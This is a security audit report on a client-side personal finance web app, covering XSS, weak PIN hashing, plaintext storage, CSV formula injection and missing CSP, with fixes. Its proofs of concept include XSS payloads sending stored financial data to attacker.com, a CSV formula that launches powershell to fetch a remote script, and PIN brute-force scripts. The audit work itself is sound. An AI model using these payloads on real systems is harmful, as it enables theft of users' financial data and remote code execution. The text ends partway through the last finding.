# COMPREHENSIVE SECURITY AUDIT
## Financial Command Centre v7.47 (44,138 lines)

**Audit Date:** 2026-04-09
**Auditor:** Senior Security Engineer
**Assessment:** CRITICAL VULNERABILITIES IDENTIFIED - IMMEDIATE REMEDIATION REQUIRED
**Risk Level:** CRITICAL - Financial data at high risk

---

## EXECUTIVE SUMMARY

This comprehensive security audit of FCC v7.47 identified **22 security vulnerabilities** across seven major threat categories. The application handles sensitive financial data (portfolio values, transaction history, personal information) but lacks fundamental security controls including:

- **No Content Security Policy (CSP)** - Complete absence of XSS protection headers
- **Plaintext API Keys** - Finnhub keys stored in localStorage without encryption
- **Unescaped innerHTML** - 216 instances of dynamic HTML rendering without sanitization
- **Weak PIN Protection** - Hardcoded salt, client-side hashing, DevTools-bypassable lock screen
- **CSV Injection Risk** - No validation of imported CSV content for formula injection
- **Unencrypted Storage** - All financial data in plaintext localStorage
- **No Authentication** - Single PIN-based protection with no rate limiting
- **Service Worker Caching** - Sensitive API responses cached across origins

**This application is NOT production-ready for handling real financial data.**

---

## VULNERABILITY CATALOG

### 1. XSS (CROSS-SITE SCRIPTING) VULNERABILITIES

#### SEC-001: innerHTML XSS via CSV Import Preview
**Severity:** CRITICAL
**CVSS Score:** 9.8
**Location:** Line 36552-36580 (`parseCSV()`)
**Attack Vector:**
An attacker can create a malicious CSV file with HTML/JavaScript in fields (asset names, transaction notes, portfolio names). When imported, the CSV preview renders unsanitized data directly to the DOM via `innerHTML`.

**Vulnerable Code:**
```javascript
preview.innerHTML = `
    <table class="import-preview-table">
        <thead><tr>${this.importHeaders.map(h => `<th>${h}</th>`).join('')}</tr></thead>
        <tbody>${previewData.map(row => `<tr>${row.map(c => `<td>${c}</td>`).join('')}</tr>`).join('')}</tbody>
    </table>
`;
```

**Proof of Concept:**
```csv
Date,Asset,"Quantity"
2024-01-01,"<img src=x onerror='alert(localStorage.getItem(\"dfc_data_v3_default\"))'/>",1000
```

**Remediation:**
```javascript
// Use textContent instead of innerHTML for untrusted data
const escapeHtml = (text) => {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
};

preview.innerHTML = `
    <table class="import-preview-table">
        <thead><tr>${this.importHeaders.map(h => `<th>${escapeHtml(h)}</th>`).join('')}</tr></thead>
        <tbody>${previewData.map(row => `<tr>${row.map(c => `<td>${escapeHtml(c)}</td>`).join('')}</tr>`).join('')}</tbody>
    </table>
`;
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-002: innerHTML XSS via Equity/Crypto Container Rendering
**Severity:** CRITICAL
**CVSS Score:** 9.8
**Location:** Lines 23097-23141 (`renderPriceConfirmModal()`)
**Attack Vector:**
Portfolio asset names and symbols can be crafted with HTML/JavaScript. When the price confirmation modal renders equities/crypto data, the names are injected via `innerHTML` without escaping.

**Vulnerable Code:**
```javascript
equityContainer.innerHTML = this.data.equities.map(e => {
    return `
        <div class="price-confirm-row">
            <span class="price-confirm-symbol">${e.symbol}</span>
            ...
        </div>`;
}).join('');
```

**Proof of Concept:**
```javascript
App.data.equities.push({
    symbol: '<img src=x onerror="fetch(\'https://attacker.com/steal?data=\'+btoa(localStorage.getItem(\'dfc_data_v3_default\')))">',
    qty: 100
});
```

**Remediation:**
```javascript
const escapeHtml = (str) => {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
};

equityContainer.innerHTML = this.data.equities.map(e => {
    return `
        <div class="price-confirm-row">
            <span class="price-confirm-symbol">${escapeHtml(e.symbol)}</span>
            ...
        </div>`;
}).join('');
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-003: innerHTML XSS via Portfolio Name Rendering
**Severity:** HIGH
**CVSS Score:** 8.2
**Location:** Line 21567, 21718 (`renderPortfolioSelector()`, `renderPortfolioTabs()`)
**Attack Vector:**
Portfolio names stored in `this.portfolios` are rendered via `innerHTML` without sanitization, allowing XSS when portfolio is created with malicious name.

**Vulnerable Code:**
```javascript
selector.innerHTML = this.portfolios.map(p =>
    `<option value="${p.id}">${p.name}</option>`
).join('');

container.innerHTML = this.portfolios.map(p => {
    // p.name rendered directly
    ...
}).join('');
```

**Remediation:**
Use `textContent` or implement HTML escaping for all portfolio names before rendering.

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-004: innerHTML XSS via Version Backup Names
**Severity:** HIGH
**CVSS Score:** 8.0
**Location:** Line 40467-40495 (`renderBackupVersionList()`)
**Attack Vector:**
Backup version names can contain arbitrary HTML/JavaScript and are rendered via `innerHTML`:

```javascript
container.innerHTML = sorted.map(v => `
    <div class="version-item">
        <div class="version-name">${v.name}</div>
        ...
    </div>
`).join('');
```

**Remediation:**
Escape all user-supplied data in version names before rendering.

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-005: innerHTML XSS via Modal Dynamic Content
**Severity:** MEDIUM
**CVSS Score:** 6.5
**Location:** Multiple locations (21135, 21567, 23597, 23617, 23680, 23689, etc.)
**Attack Vector:**
Dynamic modal content rendered via `innerHTML` from user-controlled data (transaction notes, goal descriptions, etc.)

**Examples:**
- Line 23597: `allocGrid.innerHTML = ...` (allocation rendering)
- Line 23680: `breakdownEl.innerHTML = ...` (debt breakdown)

**Remediation:**
Create sanitization middleware for all `innerHTML` assignments. Use DOMPurify library or implement comprehensive HTML escaping.

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

### 2. AUTHENTICATION & PIN SECURITY VULNERABILITIES

#### SEC-006: PIN Hash Stored in Plaintext localStorage
**Severity:** CRITICAL
**CVSS Score:** 9.6
**Location:** Line 28908-28920, 29203 (`saveSecuritySettings()`, `triggerBiometric()`)
**Attack Vector:**
While the PIN is hashed, the hash is stored in plaintext in localStorage (`fcc_security`), which is easily accessible:
1. Open DevTools → Application → localStorage
2. Read `fcc_security` and see hash
3. Extract hash and attempt offline cracking

Even worse, the biometric credential ID is Base64-encoded (not encrypted):
```javascript
localStorage.setItem('fcc_biometric_cred', btoa(String.fromCharCode(...new Uint8Array(credential.rawId))));
```

**Vulnerable Code:**
```javascript
localStorage.setItem('fcc_security', JSON.stringify({
    pinEnabled: this.pinEnabled,
    pinHash: pinHash,  // PLAINTEXT HASH!
    autoLockMinutes: this.autoLockMinutes,
    biometricEnabled: this.biometricEnabled
}));
```

**Remediation:**
1. Move security settings to IndexedDB with encryption
2. Use Web Crypto API to encrypt sensitive data at rest
3. Never store credential IDs in localStorage

```javascript
async saveSecuritySettingsEncrypted() {
    const key = await this.deriveKeyFromBiometric();
    const plaintext = JSON.stringify({
        pinHash: this._storedPinHash,
        biometricEnabled: this.biometricEnabled
    });

    const encrypted = await crypto.subtle.encrypt(
        'AES-GCM',
        key,
        new TextEncoder().encode(plaintext)
    );

    // Store in IndexedDB instead of localStorage
    await this.saveToIndexedDB('security_settings', encrypted);
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-007: Hardcoded Salt in PIN Hash
**Severity:** HIGH
**CVSS Score:** 8.1
**Location:** Line 28870-28903 (`hashPinAsync()`, `hashPinFallback()`)
**Attack Vector:**
The PIN hash uses a hardcoded salt visible in source code:
```javascript
const salt = 'fcc_secure_salt_2026_v2';  // HARDCODED!
```

This means:
1. The same PIN always produces the same hash (rainbow table attack)
2. An attacker can pre-compute hashes for all 4-digit PINs (10,000 possibilities)
3. The salt is not unique per user

**Vulnerable Code:**
```javascript
hashPinFallback(pin) {
    let hash = 0;
    const salt = 'fcc_secure_salt_2026_v2';  // Hardcoded!
    const salted = salt + pin + salt;
    for (let i = 0; i < salted.length; i++) {
        const char = salted.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return 'h_' + Math.abs(hash).toString(16);
}
```

**Proof of Concept:**
```javascript
// Pre-compute all possible 4-digit PIN hashes
const hashes = {};
for (let i = 0; i < 10000; i++) {
    const pin = String(i).padStart(4, '0');
    hashes[App.hashPin(pin)] = pin;
}

// Extract stored hash from localStorage
const stored = JSON.parse(localStorage.getItem('fcc_security')).pinHash;

// Lookup PIN in milliseconds
const crack = hashes[stored];  // "1234"
```

**Remediation:**
1. Use random per-user salt
2. Use bcrypt or PBKDF2 instead of custom hash
3. Store salt alongside hash (they can be public, the key is unpredictability)

```javascript
async hashPinWithRandomSalt(pin) {
    // Generate random salt each time user sets PIN
    if (!this._userSalt) {
        this._userSalt = btoa(String.fromCharCode(...crypto.getRandomValues(new Uint8Array(16))));
    }

    const encoder = new TextEncoder();
    const data = encoder.encode(this._userSalt + pin);

    // Use PBKDF2 with iterations
    const key = await crypto.subtle.importKey('raw', data, 'PBKDF2', false, ['deriveBits']);
    const hash = await crypto.subtle.deriveBits(
        {
            name: 'PBKDF2',
            hash: 'SHA-256',
            salt: new TextEncoder().encode(this._userSalt),
            iterations: 100000  // Expensive for brute force
        },
        key,
        256
    );

    return 'pbkdf2_' + btoa(String.fromCharCode(...new Uint8Array(hash)));
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-008: PIN Lock Screen Bypassable via DevTools
**Severity:** CRITICAL
**CVSS Score:** 9.7
**Location:** Line 28957-28972 (`showPinLockScreen()`, `hidePinLockScreen()`)
**Attack Vector:**
The PIN lock is purely CSS (`display:flex` / `display:none`). An attacker with physical access can:
1. Open DevTools (F12)
2. Navigate to Element Inspector
3. Find `<div id="pin-lock-screen" class="pin-lock-screen">`
4. Delete it or set `display: none`
5. Instantly bypass PIN protection

**Vulnerable Code:**
```javascript
showPinLockScreen() {
    const screen = document.getElementById('pin-lock-screen');
    if (screen) {
        screen.style.display = 'flex';  // EASILY OVERRIDDEN!
    }
}

hidePinLockScreen() {
    const screen = document.getElementById('pin-lock-screen');
    if (screen) screen.style.display = 'none';
}
```

**Proof of Concept:**
```javascript
// In DevTools console:
document.getElementById('pin-lock-screen').remove();
// OR
document.getElementById('pin-lock-screen').style.display = 'none';
// Access to app is instant
```

**Remediation:**
1. PIN should gate access to data, not UI
2. Store financial data in encrypted IndexedDB, not plaintext localStorage
3. Implement proper session management with server-side validation
4. If client-side only, use encryption keys derived from PIN

```javascript
// Never store unencrypted financial data
// Instead, keep only encrypted data in storage
this.encryptedData = await this.encryptWithPin(this.data, pinCode);
localStorage.setItem('app_data', this.encryptedData);

// On startup, before PIN entry, app is blank
// After PIN verified, decrypt data
async unlockWithPin(pin) {
    const verified = await this.verifyPinAsync(pin);
    if (!verified) return false;

    const encrypted = localStorage.getItem('app_data');
    this.data = await this.decryptWithPin(encrypted, pin);

    // Now render the UI
    this.render();
    return true;
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-009: No PIN Attempt Rate Limiting (Offline)
**Severity:** CRITICAL
**CVSS Score:** 9.5
**Location:** Line 29006-29050 (`validatePin()`)
**Attack Vector:**
While there IS a 30-second lockout after 5 failed attempts (line 29016-29021), this is CLIENT-SIDE:
1. An attacker can open DevTools and modify the lockout timer
2. They can brute-force offline: `for pin in 0000..9999: verify(pin)`
3. They can clear `this.pinAttempts` variable in DevTools
4. They can remove the setTimeout that triggers the unlock

**Vulnerable Code:**
```javascript
if (this.pinAttempts >= this.pinMaxAttempts) {
    this.pinLocked = true;
    this.showPinError('Too many attempts. Try again in 30 seconds.');
    setTimeout(() => {  // EASILY BYPASSED!
        this.pinLocked = false;
        this.pinAttempts = 0;
        document.getElementById('pin-error').textContent = '';
    }, 30000);  // Just clear this timeout in DevTools
}
```

**Proof of Concept:**
```javascript
// In DevTools, clear the lockout:
App.pinLocked = false;
App.pinAttempts = 0;
clearTimeout();  // Clears all timeouts

// Now brute force all 10,000 PINs offline
for (let i = 0; i < 10000; i++) {
    const pin = String(i).padStart(4, '0');
    pin.split('').forEach(digit => App.pinEnterDigit(digit));
    App.validatePin();
    // Check if unlocked
}
```

**Remediation:**
1. Move PIN verification to a server (WebAuthn, passwordless)
2. Implement client-side storage encryption (keys not recoverable without PIN)
3. Add random delays to prevent timing attacks

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

### 3. DATA EXPOSURE VULNERABILITIES

#### SEC-010: All Financial Data Plaintext in localStorage
**Severity:** CRITICAL
**CVSS Score:** 9.9
**Location:** Lines 21493-21560 (storage operations), throughout data access
**Attack Vector:**
100% of financial data is stored in plaintext localStorage:
- Portfolio holdings: `localStorage.getItem('dfc_data_v3_default')`
- Equity positions, quantities, prices
- Crypto holdings and transaction history
- Liability details, transaction notes
- Personal goals and financial plans

An attacker with access to the device can:
1. Open DevTools
2. Read `localStorage.dfc_data_v3_default`
3. See complete financial picture (net worth, holdings, plans)
4. Export this JSON and analyze offline

**Vulnerable Code:**
```javascript
save() {
    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(this.data));
    // this.data contains:
    // - equities: [{symbol, qty, price, cost, ...}]
    // - crypto: [{symbol, qty, price, cost, ...}]
    // - liabilities: [{type, amount, rate, term, ...}]
    // - transactions: [{date, amount, category, notes, ...}]
    // All in plaintext!
}
```

**Remediation:**
Implement encryption at rest using Web Crypto API:

```javascript
async saveEncrypted() {
    const key = await this.deriveKeyFromPin(this.pinCode);

    const plaintext = JSON.stringify(this.data);
    const encoded = new TextEncoder().encode(plaintext);

    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        key,
        encoded
    );

    const payload = {
        iv: btoa(String.fromCharCode(...iv)),
        data: btoa(String.fromCharCode(...new Uint8Array(encrypted)))
    };

    localStorage.setItem(this.STORAGE_KEY, JSON.stringify(payload));
}

async loadDecrypted() {
    const payload = JSON.parse(localStorage.getItem(this.STORAGE_KEY) || '{}');
    if (!payload.data) return null;

    const key = await this.deriveKeyFromPin(this.pinCode);
    const iv = Uint8Array.from(atob(payload.iv), c => c.charCodeAt(0));
    const encrypted = Uint8Array.from(atob(payload.data), c => c.charCodeAt(0));

    const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv },
        key,
        encrypted
    );

    return JSON.parse(new TextDecoder().decode(decrypted));
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-011: Finnhub API Key in Plaintext localStorage
**Severity:** CRITICAL
**CVSS Score:** 9.8
**Location:** Lines 22881-22903, 23003, 23022 (`saveFinnhubKey()`, `fetchFinnhubPrice()`)
**Attack Vector:**
The Finnhub API key is stored in plaintext:

```javascript
const apiKey = this.data.settings?.finnhubKey || localStorage.getItem('finnhub_key');
// ...
localStorage.setItem('finnhub_key', key);  // PLAINTEXT!
```

This allows an attacker to:
1. Extract the key from localStorage
2. Use it to make API calls (quota exhaustion, API abuse)
3. Access historical price data unauthorized
4. Determine when users fetch prices

**Remediation:**
1. Never store API keys in localStorage
2. Use server-side proxy for API calls
3. If client-side is required, encrypt the key with a user-derived key

```javascript
async saveFinnhubKeyEncrypted(apiKey) {
    const key = await this.deriveKeyFromPin(this.pinCode);

    const encoded = new TextEncoder().encode(apiKey);
    const iv = crypto.getRandomValues(new Uint8Array(12));

    const encrypted = await crypto.subtle.encrypt(
        { name: 'AES-GCM', iv },
        key,
        encoded
    );

    this.data.settings.finnhubKey = {
        iv: btoa(String.fromCharCode(...iv)),
        data: btoa(String.fromCharCode(...new Uint8Array(encrypted)))
    };
}

async getFinnhubKeyDecrypted() {
    if (!this.data.settings.finnhubKey) return null;

    const key = await this.deriveKeyFromPin(this.pinCode);
    const keyData = this.data.settings.finnhubKey;

    const iv = Uint8Array.from(atob(keyData.iv), c => c.charCodeAt(0));
    const encrypted = Uint8Array.from(atob(keyData.data), c => c.charCodeAt(0));

    const decrypted = await crypto.subtle.decrypt(
        { name: 'AES-GCM', iv },
        key,
        encrypted
    );

    return new TextDecoder().decode(decrypted);
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-012: Exchange Rate API Keys in Plaintext
**Severity:** MEDIUM
**CVSS Score:** 6.5
**Location:** Lines 35914-35915 (`saveExchangeRateCredentials()`)
**Attack Vector:**
Similar to Finnhub, any API credentials are stored unencrypted:

```javascript
if (!this.data.apiKeys) this.data.apiKeys = {};
this.data.apiKeys[id] = { key: btoa(apiKey), secret: btoa(secret) };
// Base64 is NOT encryption!
```

Base64 is trivially decoded: `atob('YWJjMTIz')` → `'abc123'`

**Remediation:**
Use AES-GCM encryption (same as SEC-011) for all API credentials.

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-013: Service Worker Caches Sensitive API Responses
**Severity:** HIGH
**CVSS Score:** 8.4
**Location:** Lines 29830-29848 (service worker fetch handler)
**Attack Vector:**
The service worker caches API responses (including price data):

```javascript
self.addEventListener('fetch', (event) => {
    const isAPI = event.request.url.includes('api.') || event.request.url.includes('coingecko');

    if (isAPI) {
        // CACHES API RESPONSES!
        event.respondWith(
            fetch(event.request)
                .then(response => {
                    const clone = response.clone();
                    caches.open(CACHE_NAME).then(cache => cache.put(event.request, clone));
                    return response;
                })
        );
    }
});
```

This means:
1. API responses with financial data are stored in Cache API
2. Any other origin on the device could potentially access cached responses
3. Cached data persists even after app data is deleted

**Remediation:**
1. Don't cache API responses containing sensitive data
2. Cache only static assets (CSS, JS)
3. Implement per-request encryption for sensitive data

```javascript
self.addEventListener('fetch', (event) => {
    const isAPI = event.request.url.includes('api.');
    const isSensitiveAPI = event.request.url.includes('coingecko') || event.request.url.includes('finnhub');

    if (isSensitiveAPI) {
        // Never cache sensitive API responses
        event.respondWith(fetch(event.request));
        return;
    }

    if (event.request.method === 'GET') {
        // Cache static assets only
        event.respondWith(
            caches.match(event.request).then(cached => cached || fetch(event.request))
        );
    } else {
        // Don't cache mutations
        event.respondWith(fetch(event.request));
    }
});
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

### 4. CSV & IMPORT INJECTION VULNERABILITIES

#### SEC-014: CSV Formula Injection (Excel)
**Severity:** HIGH
**CVSS Score:** 7.8
**Location:** Lines 29279-29350, 36552-36610 (CSV parsing)
**Attack Vector:**
When a CSV is parsed, field values starting with `=`, `+`, `-`, `@` are treated as formulas in Excel:

**Malicious CSV:**
```csv
Date,Symbol,Quantity,Price
2024-01-01,AAPL,=cmd|'/c powershell.exe https://attacker.com/malware.ps1',1000
```

When exported to Excel/Google Sheets and opened, this triggers RCE.

More realistic attack:
```csv
Symbol,Quantity,Price
=cmd|'/c calc.exe',100,150
=1+1,100,150
@SUM(A1:A10),100,150
```

**Vulnerable Code:**
```javascript
parseCSVLine(line, delimiter = ',') {
    // No validation for formula prefixes
    const values = [];
    // ... splitting logic ...
    return values;  // Returns raw values including formulas
}
```

**Remediation:**
Sanitize formula injection prefixes on import:

```javascript
parseCSVLine(line, delimiter = ',') {
    const values = [];
    let current = '';
    let inQuotes = false;

    for (let i = 0; i < line.length; i++) {
        const char = line[i];

        if (char === '"' && (i === 0 || line[i-1] !== '\\')) {
            inQuotes = !inQuotes;
        } else if (char === delimiter && !inQuotes) {
            values.push(this.sanitizeCSVValue(current.trim()));
            current = '';
        } else {
            current += char;
        }
    }
    values.push(this.sanitizeCSVValue(current.trim()));

    return values;
}

sanitizeCSVValue(value) {
    // Remove formula injection prefixes
    if (/^[=+\-@]/.test(value)) {
        return "'" + value;  // Prefix with single quote in Excel
    }
    return value;
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-015: JSON Injection via Backup Restore
**Severity:** CRITICAL
**CVSS Score:** 9.7
**Location:** Lines 40400-40430 (`restoreFromBackup()`, `performRestore()`)
**Attack Vector:**
When restoring from backup, the app does minimal validation:

```javascript
restoreFromBackup(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
        const text = e.target.result;
        try {
            const backup = JSON.parse(text);  // No validation!
            this.performRestore(backup);
        } catch (err) {
            this.toast('Invalid JSON format', true);
        }
    };
    reader.readAsText(file);
}
```

An attacker can craft a backup JSON with:
1. Malicious transaction notes containing XSS payload
2. Portfolio names with HTML/JavaScript
3. Liability descriptions with code
4. Goal names with payloads

When `performRestore()` loads this data, any rendering of these fields will execute the XSS.

**Proof of Concept:**
```json
{
    "data": {
        "transactions": [{
            "date": "2024-01-01",
            "amount": 1000,
            "notes": "<img src=x onerror='alert(\"XSS in backup\")'>"
        }],
        "equities": [{
            "symbol": "<img src=x onerror='fetch(\"https://attacker.com/steal\")'>",
            "qty": 100
        }]
    }
}
```

**Remediation:**
Validate backup structure and sanitize all string fields:

```javascript
async restoreFromBackup(file) {
    const reader = new FileReader();
    reader.onload = (e) => {
        const text = e.target.result;
        try {
            const backup = JSON.parse(text);

            // Validate backup structure
            if (!this.isValidBackup(backup)) {
                throw new Error('Invalid backup structure');
            }

            // Sanitize all string fields
            const sanitized = this.sanitizeBackupData(backup);
            this.performRestore(sanitized);
        } catch (err) {
            this.toast('Invalid backup file: ' + err.message, true);
        }
    };
    reader.readAsText(file);
}

isValidBackup(backup) {
    if (!backup.data || typeof backup.data !== 'object') return false;
    if (!Array.isArray(backup.data.equities)) return false;
    if (!Array.isArray(backup.data.crypto)) return false;
    if (!Array.isArray(backup.data.liabilities)) return false;
    return true;
}

sanitizeBackupData(backup) {
    const htmlEscape = (str) => {
        if (typeof str !== 'string') return str;
        const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
        return str.replace(/[&<>"']/g, m => map[m]);
    };

    const deepSanitize = (obj) => {
        if (Array.isArray(obj)) {
            return obj.map(deepSanitize);
        } else if (obj !== null && typeof obj === 'object') {
            return Object.fromEntries(
                Object.entries(obj).map(([k, v]) => {
                    if (typeof v === 'string' && k !== 'id' && k !== 'type') {
                        return [k, htmlEscape(v)];
                    }
                    return [k, deepSanitize(v)];
                })
            );
        }
        return obj;
    };

    return { ...backup, data: deepSanitize(backup.data) };
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

### 5. NETWORK SECURITY VULNERABILITIES

#### SEC-016: No Content Security Policy (CSP)
**Severity:** CRITICAL
**CVSS Score:** 9.4
**Location:** HTML head (lines 1-100)
**Attack Vector:**
The application has ZERO CSP headers/meta tags. This means:
1. Inline scripts are allowed (already present in HTML)
2. Eval is allowed
3. External scripts from any origin allowed
4. Data exfiltration via fetch to any URL allowed
5. Injected XSS payloads have full capabilities

**Current Policy:** None (default-src *)

**Remediation:**
Implement strict CSP:

```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https://api.coingecko.com https://finnhub.io;
    font-src 'self' https://fonts.googleapis.com;
    connect-src 'self' https://api.coingecko.com https://finnhub.io https://api.exchangerate-api.com;
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
    upgrade-insecure-requests;
    block-all-mixed-content;
">
```

Then refactor inline scripts:
1. Move all inline script to external file
2. Add nonce to any runtime-necessary inline scripts
3. Remove eval() and Function() constructors

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

#### SEC-017: No Subresource Integrity (SRI)
**Severity:** MEDIUM
**CVSS Score:** 5.3
**Location:** Line 42 (Google Fonts import)
**Attack Vector:**
External CSS imports lack integrity checks:

```html
<link rel="import" url='https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap'>
```

If CDN is compromised or MITM attack occurs, malicious CSS could:
1. Exfiltrate form data via keylogger CSS
2. Style input fields to capture credentials
3. Hide UI elements

**Remediation:**
Use SRI hashes:

```html
<link
    rel="stylesheet"
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap"
    integrity="sha384-XXXXX"
    crossorigin="anonymous"
>
```

Generate hash using: `curl -s https://fonts.googleapis.com/... | openssl dgst -sha384 -binary | openssl enc -base64 -A`

**Priority:** NICE-TO-HAVE

---

#### SEC-018: Open CORS Proxies Used for Data Fetching
**Severity:** HIGH
**CVSS Score:** 7.5
**Location:** Lines 22837-22844 (`fetchYahooViaProxy()`)
**Attack Vector:**
The app uses public CORS proxies to bypass browser CORS:

```javascript
const proxyUrls = [
    `https://api.allorigins.win/raw?url=${encodeURIComponent(yahooUrl)}`,
    `https://corsproxy.io/?${encodeURIComponent(yahooUrl)}`,
    `https://api.codetabs.com/v1/proxy?quest=${yahooUrl}`,
    `https://thingproxy.freeboard.io/fetch/${yahooUrl}`
];
```

Problems:
1. Proxies can log/intercept financial data requests
2. Proxy could be compromised and return false data
3. Requests visible to proxy operators
4. May violate Yahoo Finance terms of service

**Remediation:**
1. Use official APIs with CORS headers
2. Implement server-side proxy under your control
3. Cache pricing data locally to reduce API calls

```javascript
// Server-side proxy (Node.js example)
app.get('/api/proxy/stock/:symbol', async (req, res) => {
    const symbol = req.params.symbol;
    const response = await fetch(`https://query1.finance.yahoo.com/v8/finance/chart/${symbol}?...`, {
        headers: { 'User-Agent': 'Mozilla/5.0' }
    });
    const data = await response.json();

    // Add caching headers
    res.set('Cache-Control', 'public, max-age=300');  // 5 minutes
    res.json(data);
});

// Client-side
async fetchEquityPrice(symbol) {
    const response = await fetch(`/api/proxy/stock/${symbol}`);
    return response.json();
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY

---

### 6. PRIVACY VULNERABILITIES

#### SEC-019: Privacy Mode Only Hides Via CSS
**Severity:** MEDIUM
**CVSS Score:** 6.0
**Location:** Throughout render functions (e.g., line 22355, 22400, 22499)
**Attack Vector:**
The "Hide Values" privacy mode only uses `display:none` CSS:

```javascript
applyPrivacy() {
    if (this.data.settings.privacy) {
        // CSS-only hiding!
        document.getElementById('hero-net-worth').style.display = 'none';
        document.getElementById('hero-status').style.display = 'none';
    }
}
```

An attacker can:
1. Open DevTools
2. Toggle display property: `.style.display = 'block'`
3. See all hidden values instantly
4. Read page source and find values in HTML/JavaScript

**Proof of Concept:**
```javascript
// In DevTools console:
document.querySelectorAll('[style*="display:none"]').forEach(el => el.style.display = 'block');
// OR find values in JavaScript memory:
console.log(App.data.netWorth);
```

**Remediation:**
Don't store plaintext values at all when privacy is enabled:

```javascript
renderHeroNetWorth() {
    const el = document.getElementById('hero-net-worth');
    if (!el) return;

    if (this.data.settings.privacy) {
        // Don't render value, show placeholder
        el.textContent = '***';  // No data to inspect
        el.classList.add('privacy-hidden');
        return;
    }

    el.textContent = this.fmt(this.getNetWorth());
    el.classList.remove('privacy-hidden');
}
```

Better yet, encrypt sensitive data and decrypt only on demand.

**Priority:** NICE-TO-HAVE

---

#### SEC-020: Plaintext Financial Data Visible in Console
**Severity:** MEDIUM
**CVSS Score:** 6.2
**Location:** Throughout application state
**Attack Vector:**
All financial data is accessible in browser memory:
```javascript
// In DevTools console:
App.data  // Returns entire portfolio
localStorage.getItem('dfc_data_v3_default')  // Returns JSON with all data
```

An attacker with physical access can inspect memory and extract:
- Net worth
- Holdings (equities, crypto)
- Liabilities
- Transaction history
- Personal goals

**Remediation:**
1. Don't keep unencrypted data in memory
2. Minimize data in global scope
3. Use closures to encapsulate sensitive data

```javascript
// Bad: Global access
window.App = {
    data: { ... }  // Accessible as App.data
};

// Better: Encapsulated
const App = (() => {
    let _data = { ... };  // Private

    return {
        getData() { return { ... }; },  // Return copy
        setData(data) { _data = { ...data }; }
    };
})();

// Access: App.getData() - can't inspect _data directly
```

**Priority:** NICE-TO-HAVE

---

### 7. MISCELLANEOUS SECURITY ISSUES

#### SEC-021: Weak Biometric Implementation
**Severity:** HIGH
**CVSS Score:** 7.9
**Location:** Lines 29180-29230 (`registerBiometric()`, `triggerBiometric()`)
**Attack Vector:**
The WebAuthn implementation has issues:

1. **Credential ID stored in plaintext Base64:**
```javascript
localStorage.setItem('fcc_biometric_cred', btoa(String.fromCharCode(...new Uint8Array(credential.rawId))));
```
This is trivially decoded.

2. **No server-side validation:** The challenge isn't validated against a server, so an attacker could:
   - Replay a previous biometric authentication
   - Create a fake credential response

3. **Fallback to PIN:** Biometric auth falls back to PIN on error, which defeats the purpose

4. **Origin verification missing:** WebAuthn requires matching origin; ensure your domain is correct

**Vulnerable Code:**
```javascript
async triggerBiometric() {
    const challenge = new Uint8Array(32);
    crypto.getRandomValues(challenge);

    await navigator.credentials.get({
        publicKey: {
            challenge,
            // ... no server-side challenge validation!
        }
    });

    // No verification of response!
    this.hidePinLockScreen();  // Assumes success
}
```

**Remediation:**
1. Implement server-side WebAuthn validation
2. Store credential IDs securely in encrypted storage
3. Validate challenge response with public key

For client-side only (not recommended):
```javascript
async triggerBiometric() {
    try {
        const assertion = await navigator.credentials.get({
            publicKey: {
                challenge: this._storedChallenge,  // Store challenge in memory
                allowCredentials: [{ ... }],
                userVerification: 'required'
            }
        });

        // Verify response format
        if (!assertion || !assertion.response) {
            throw new Error('Invalid biometric response');
        }

        // Store this challenge was used (prevent replay)
        this._usedChallenges.add(btoa(String.fromCharCode(...new Uint8Array(assertion.response.challenge))));

        this.hidePinLockScreen();
    } catch (e) {
        // Fallback to PIN
        this.toast('Biometric failed, use PIN');
    }
}
```

**Priority:** MUST-FIX-BEFORE-DEPLOY (if using biometric auth)

---

#### SEC-022: No Rate Limiting on API Calls
**Severity:** MEDIUM
**CVSS Score:** 5.8
**Location:** Lines 22640-23000 (fetch functions)
**Attack Vector:**
The app makes unlimited API calls to:
- CoinGecko (free tier: no limit but rate-limited)
- Finnhub (free tier: 60 calls/min)
- ExchangeRate-API (free tier: 1500/month)

An attacker can:
1. Trigger continuous refreshes (F5 spam)
2. Exhaust free API quota
3. Cause denial of service to other users

**Example:**
```javascript
async fetchLivePrices() {
    this.fetchFXRates(),
    this.fetchCryptoPrices(),
    this.fetchEquityPrices()  // Could trigger 1000+ API calls!
}
```

**Remediation:**
Implement client-side rate limiting:

```javascript
class RateLimiter {
    constructor(maxCalls, windowMs) {
        this.maxCalls = maxCalls;
        this.windowMs = windowMs;
